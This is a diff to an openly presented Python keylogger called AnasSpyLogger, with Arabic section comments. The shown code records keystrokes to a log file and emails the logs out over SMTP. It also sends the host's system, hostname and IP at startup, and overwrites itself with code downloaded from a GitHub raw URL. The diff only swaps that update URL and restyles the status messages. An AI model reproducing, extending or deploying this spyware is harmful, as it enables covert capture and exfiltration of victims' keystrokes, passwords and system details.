@@ -22,7 +22,7 @@ os_info = platform.system()
 log_file = "keylogs.txt"
 buffer = []
 buffer_limit = 50
-update_url = "https://raw.githubusercontent.com/anaslabrini/test-keylogger.py/refs/heads/main/test-keylogger.py"  # رابط التحديث المباشر للسكريبت
+update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"  # رابط التحديث المباشر للسكريبت
 
 # ===== تحويل المفاتيح الخاصة إلى نصوص بشرية =====
 key_mapping = {
@@ -69,10 +69,10 @@ def send_email(subject, content):
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             smtp.send_message(msg)
         
-        print(f"✅ Email sent with log file: {log_filename}")
+        print(f"[+] Email sent with log file: {log_filename}")
 
     except Exception as e:
-        print(f"❌ Email error: {e}")
+        print(f"[-] Email error: {e}")
 
 # ===== إرسال إشعار بدء التشغيل =====
 def send_startup_info():
@@ -82,7 +82,7 @@ def send_startup_info():
         system_info = f"System: {platform.system()} {platform.release()}\nHostname: {hostname}\nIP: {local_ip}"
         send_email("System Startup Notification", system_info)
     except Exception as e:
-        print(f"❌ Error sending startup info: {e}")
+        print(f"[-] Error sending startup info: {e}")
 
 # ===== تحديث السكربت =====
 def update_script():
@@ -91,11 +91,11 @@ def update_script():
         if response.status_code == 200:
             with open(__file__, 'w') as f:
                 f.write(response.text)
-            print("✅ Script updated successfully.")
+            print("[+] Script updated successfully.")
         else:
-            print(f"❌ Failed to download update. Status Code: {response.status_code}")
+            print(f"[-] Failed to download update. Status Code: {response.status_code}")
     except requests.exceptions.RequestException as e:
-        print(f"❌ Update error: {e}")
+        print(f"[-] Update error: {e}")
 
 # ===== التقاط الضغطات =====
 def on_press(key):
